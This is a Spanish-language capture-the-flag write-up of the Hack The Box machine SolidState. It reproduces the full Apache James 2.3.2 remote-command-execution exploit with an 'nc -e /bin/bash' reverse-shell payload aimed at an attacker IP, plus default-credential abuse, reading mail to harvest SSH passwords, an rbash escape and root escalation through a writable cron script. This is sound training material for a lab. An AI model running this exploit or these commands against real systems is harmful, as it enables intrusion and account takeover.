---
title: Hack The Box SolidState
author: k4miyo
date: 2021-11-26
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Linux]
tags: [File Misconfiguration]
ping: true
---

## SolidState
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.51.

```bash
❯ ping -c 1 10.10.10.51
PING 10.10.10.51 (10.10.10.51) 56(84) bytes of data.
64 bytes from 10.10.10.51: icmp_seq=1 ttl=63 time=138 ms

--- 10.10.10.51 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 138.454/138.454/138.454/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.10.51 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-19 22:15 CDT
Initiating Ping Scan at 22:15
Scanning 10.10.10.51 [4 ports]
Completed Ping Scan at 22:15, 0.24s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:15
Scanning 10.10.10.51 [65535 ports]
Discovered open port 110/tcp on 10.10.10.51
Discovered open port 25/tcp on 10.10.10.51
Discovered open port 80/tcp on 10.10.10.51
Discovered open port 22/tcp on 10.10.10.51
Discovered open port 4555/tcp on 10.10.10.51
Discovered open port 119/tcp on 10.10.10.51
Completed SYN Stealth Scan at 22:16, 41.11s elapsed (65535 total ports)
Nmap scan report for 10.10.10.51
Host is up (0.14s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 41.50 seconds
           Raw packets sent: 71008 (3.124MB) | Rcvd: 70377 (2.815MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬───────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.51
   5   │     [*] Open ports: 22,25,80,110,119,4555
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p22,25,80,110,119,4555 10.10.10.51 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-19 22:26 CDT
Nmap scan report for 10.10.10.51
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.16 [10.10.14.16])
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3    JAMES pop3d 2.3.2
119/tcp  open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.92%I=7%D=10/19%Time=616F8C6B%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\nP
SF:lease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPassw
SF:ord:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 266.14 seconds
```

Vemos el servicio HTTP por el puerto 80, así que mediante el uso de la herramienta `whatweb` trataremos de ver que tecnologías presenta el sitio web:

```bash
❯ whatweb http://10.10.10.51/
http://10.10.10.51/ [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], Email[webadmin@solid-state-security.com], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.51], JQuery, Script, Title[Home - Solid State Security]
```

Vemos que nos enfrentamos ante un **Apache 2.4.25**, en servidor con sistema operativo **Debian** y un correo electrónico `webadmin@solid-state-security.com` que viendo el dominio, no se encuentra relacionado con la plataforma de Hack The Box; así que sólo nos quedamos por el posible usuario `webadmin`. Ahora vamos a ver el contenido vía web:

![](/assets/images/htb-solidstate/solidstate-web.png)

Si tratamos de buscar por la web, no encontramos nada interesante o de relevancia. Analizando nuestra captura de `nmap`, tenemos un puerto curioso 4555 asociado al servicio ***JAMES Remote Administration Tool 2.3.2***. A partir de este punto existen dos formas para poder ingresar a la máquina; el primero es mediante un exploit público asociado a la tecnología ***Apache James 2.3.2***:

```bash
❯ searchsploit james 2.3.2
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)           | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                                           | linux/remote/35513.py
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Lo descargamos en nuestro directorio de trabajo:

```bash
❯ searchsploit -m linux/remote/35513.py
  Exploit: Apache James Server 2.3.2 - Remote Command Execution
      URL: https://www.exploit-db.com/exploits/35513
     Path: /usr/share/exploitdb/exploits/linux/remote/35513.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/k4miyo/Documentos/HTB/SolidState/content/35513.py


❯ mv 35513.py james_rce.py
```

Ahora, analizamos el exploit para ver que realiza y si es necesario realizar modificaciones para nuestro caso. El parámetro `payload` lo modificaremos para que se nos entable una reverse shell a nuestro máquina de atacate:

```python
payload = 'nc -e /bin/bash 10.10.14.23 443'
```

Al ejecutar el exploit, vemos que nos solicita parámetros:

```bash
❯ python2 james_rce.py
[-]Usage: python james_rce.py <ip>
[-]Exemple: python james_rce.py 127.0.0.1
```

Vamos a asignarle la dirección IP de la máquina víctima y nos ponemos en escucha por el puerto 443:

```bash
❯ python2 james_rce.py 10.10.10.51
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in.
```

Ahora tenemos que esperar que alguien se loguee para que se nos entable la shell; sin embargo, para este caso no vamos a recibir ninguna solicitud, por lo que vamos a tomar otro camino siguiendo un poco el proceso del exploit.

```python
#!/usr/bin/python
#
# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
# Date: 16\10\2014
# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu, Debian
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

import socket
import sys
import time

# specify payload
#payload = 'touch /tmp/proof.txt' # to exploit on any user 
payload = 'nc -e /bin/bash 10.10.14.23 443' # to exploit only on root
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'

if len(sys.argv) != 2:
    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
    sys.exit(1)

ip = sys.argv[1]

def recv(s):
        s.recv(1024)
        time.sleep(0.2)

try:
    print "[+]Connecting to James Remote Administration Tool..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,4555))
    s.recv(1024)
    s.send(user + "\n")
    s.recv(1024)
    s.send(pwd + "\n")
    s.recv(1024)
    print "[+]Creating user..."
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
    s.recv(1024)
    s.send("quit\n")
    s.close()

    print "[+]Connecting to James SMTP server..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))
    s.send("ehlo team@team.pl\r\n")
    recv(s)
    print "[+]Sending payload..."
    s.send("mail from: <'@team.pl>\r\n")
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
    recv(s)
    s.send("data\r\n")
    recv(s)
    s.send("From: team@team.pl\r\n")
    s.send("\r\n")
    s.send("'\n")
    s.send(payload + "\n")
    s.send("\r\n.\r\n")
    recv(s)
    s.send("quit\r\n")
    recv(s)
    s.close()
    print "[+]Done! Payload will be executed once somebody logs in."
except:
    print "Connection failed."

```

Nos conectamos al servidor por el puerto 4555 con las credenciales *root : root*.

```bash
❯ telnet 10.10.10.51 4555
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

Con el comando `help` vemos que tenemos algunas opciones; vamos a utilizar primero `listusers` para ver los usuarios que se encuentran en el servicio:

```bash
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin
```

El usuario `../../../../../../../../etc/bash_completion.d` fue el que nos creo el exploit. Ahora vemos que tenemos la posibilidad de cambiar la contraseña de un usuario con el comando `setpassword`; asi que para este caso vamos a tomar al usuario `mindy` y modificaremos la contraseña como `mindy123`:

```bash
setpassword mindy mindy123
Password for mindy reset
```

Ahora con esto, podemos ingresar al servicio POP3 por el puerto 110 como el usuario `mindy`:

```bash
❯ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS mindy123
+OK Welcome mindy
```

Ya nos encontramos como el usuario `mindy` dentro dle servicio POP3, ahora con el comando `LIST` podemos ver los correos del usuario y con `RETR [id]` podemos ver el contenido de los mismos:

```bash
LIST
+OK 2 1945
1 1109
2 836
RETR 1                         
+OK Message follows          
Return-Path: <mailadmin@localhost>              
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>                                                                   
MIME-Version: 1.0                                               
Content-Type: text/plain; charset=us-ascii     
Content-Transfer-Encoding: 7bit                                 
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])                
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798                                                               
          for <mindy@localhost>;                                
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)                 
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)                     
From: mailadmin@localhost                                                                                                        
Subject: Welcome                                                                                                                 

Dear Mindy,    
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critica
l in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Securit
y and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your tr
ansition so, please know that you can call on any of us to assist you.                                                           

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2  
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>; 
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
```

De acuerdo con el contenido de los correo, vemos unas credenciales de acceso por el servicio SSH, así que vamos a guardarlas y probarlas:

```bash
❯ ssh mindy@10.10.10.51
The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.51' (ECDSA) to the list of known hosts.
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
-rbash: L: command not found
-rbash: attributestLjava/util/HashMap: No such file or directory
-rbash: L
         errorMessagetLjava/lang/String: No such file or directory
-rbash: L
         lastUpdatedtLjava/util/Date: No such file or directory
-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
-rbash: $'L\004nameq~\002L': command not found
-rbash: recipientstLjava/util/Collection: No such file or directory
-rbash: L: command not found
-rbash: $'remoteAddrq~\002L': command not found
-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
-rbash: @team.pl>
Message-ID: <9152149.0.1635800669443.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
Received: from 10.10.14.23 ([10.10.14.23])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 285
          for <../../../../../../../../etc/bash_completion.d@localhost>;
          Mon, 1 Nov 2021 17:03:49 -0400 (EDT)
Date: Mon, 1 Nov 2021 17:03:49 -0400 (EDT)
From: team@team.pl

: No such file or directory
(UNKNOWN) [10.10.14.23] 443 (https) : Connection refused
-rbash: $'\r': command not found
mindy@solidstate:~$
mindy@solidstate:~$ whoami
-rbash: whoami: command not found
mindy@solidstate:~$ 
```

Vemos que nos contramos en una `rbash` y nos limita los comandos que podemos ejecutar y podemos comprobarlo si ingresamos a la ruta `/home` del usuario `mindy` y vemos un directorio de nombre `bin` el cual tiene los binarios que podemos utilizar `cat`, `env` y `ls`.

```bash
mindy@solidstate:~$ ls -l
total 8
drwxr-x--- 2 mindy mindy 4096 Apr 26  2021 bin
-rw------- 1 mindy mindy   33 Nov 18  2020 user.txt
mindy@solidstate:~$ ls -l bin/
total 0
lrwxrwxrwx 1 root root 8 Aug 22  2017 cat -> /bin/cat
lrwxrwxrwx 1 root root 8 Aug 22  2017 env -> /bin/env
lrwxrwxrwx 1 root root 7 Aug 22  2017 ls -> /bin/ls
mindy@solidstate:~$
```

Podríamos tratar de escapar de la `rbash` desde el comando `ssh`:

```bash
❯ ssh mindy@10.10.10.51 "whoami"
mindy@10.10.10.51's password: 
mindy
```

Vemos que a través de la herramienta `ssh` podemos ejecutar comandos que escapan de la `rbash`; asi que vamos a ejecutar una `bash`:

```bash
❯ ssh mindy@10.10.10.51 bash
mindy@10.10.10.51's password: 
whoami
mindy
```

Para trabajar mas cómodos, hacemos un [Tratamiento de la tty](/posts/tratamiento-tty) con python:
![](/assets/images/htb-solidstate/banner-solidstate.jpg)

```bash
whereis python
python: /usr/bin/python /usr/bin/python2.7 /usr/bin/python3.5m /usr/bin/python3.5 /usr/lib/python2.7 /usr/lib/python3.5 /etc/python /etc/python2.7 /etc/python3.5 /usr/local/lib/python2.7 /usr/local/lib/python3.5 /usr/include/python2.7 /usr/include/python3.5m /usr/share/python /usr/share/man/man1/python.1.gz

python -c 'import pty; pty.spawn("/bin/bash")'
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
```

Y ahora si ya podemos visualizar la flag (user.txt) con una tty totalmente interactiva. Ahora necesitamos escalar privilegios, por lo que vamos a enumerar un poco el sistema.

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ sudo -l
bash: sudo: command not found
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls -l
total 8
drwxr-x--- 2 mindy mindy 4096 Apr 26  2021 bin
-rw------- 1 mindy mindy   33 Nov 18  2020 user.txt
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls -la
total 28
drwxr-x--- 4 mindy mindy 4096 Apr 26  2021 .
drwxr-xr-x 4 root  root  4096 Apr 26  2021 ..
lrwxrwxrwx 1 root  root     9 Nov 18  2020 .bash_history -> /dev/null
-rw-r--r-- 1 root  root     0 Aug 22  2017 .bash_logout
-rw-r--r-- 1 root  root   338 Aug 22  2017 .bash_profile
-rw-r--r-- 1 root  root  1001 Aug 22  2017 .bashrc
-rw------- 1 root  root     0 Aug 22  2017 .rhosts
-rw------- 1 root  root     0 Aug 22  2017 .shosts
drw------- 2 root  root  4096 Apr 26  2021 .ssh
drwxr-x--- 2 mindy mindy 4096 Apr 26  2021 bin
-rw------- 1 mindy mindy   33 Nov 18  2020 user.txt
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cd /
${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ find \-perm 4000 2>/dev/null
${debian_chroot:+($debian_chroot)}mindy@solidstate:/$
```

No vemos nada interesante. Asi que vamos a listar los procesos que se ejecutar en tiempos regualares de tiempo con nuestra herramienta [ProcMon](/posts/procmon):

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/home/james$ cd /dev/shm/
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ nano procmon.sh
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ chmod +x procmon.sh 
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ./procmon.sh 
> /usr/sbin/CRON -f
> /bin/sh -c python /opt/tmp.py
> python /opt/tmp.py
< /usr/sbin/CRON -f
< /bin/sh -c python /opt/tmp.py
< python /opt/tmp.py
^C
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$
```

Vemos que se está ejecutando el archivo `/opt/tmp.py`, así que vamos a echarle un ojo:

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ cd /opt/
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -l
total 8
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$
```

Vemos que el propietario es el usuario **root** y que el ejecutar el archivo, borra todo lo que se encuentre en `/tmp/`. Si vemos los permisos, tenemos privilegio de lectura, escritura y ejecución y como el usuario **root** ejecutar el archivo a en intervalos regualres, podemos modificar el contenido del script:

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py 
i#!/usr/bin/env python
import os
import sys
try:
     os.system('chmod 4755 /bin/dash')
except:
     sys.exit()

${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -l /bin/dash
-rwxr-xr-x 1 root root 124492 Jan 24  2017 /bin/dash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$
```

Esperamos un momento a que el usuario **root** ejecute el script y tenga permisos SUID la `/bin/dash` *Debian Almquist shell* (**Nota**: En caso de que no se obtenga el permiso SUID, se recomienda reinicar la máquina):

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -l /bin/dash
-rwsr-xr-x 1 root root 124492 Jan 24  2017 /bin/dash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$
```

Ya tenemos los permisos SUID en la `/bin/dash`, así que ejecutamos `dash` para acceder como **root**.

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ dash
# whoami
root
# 
```

Ya somo el usuario **root** y podemos visualizar la flag (root.txt).
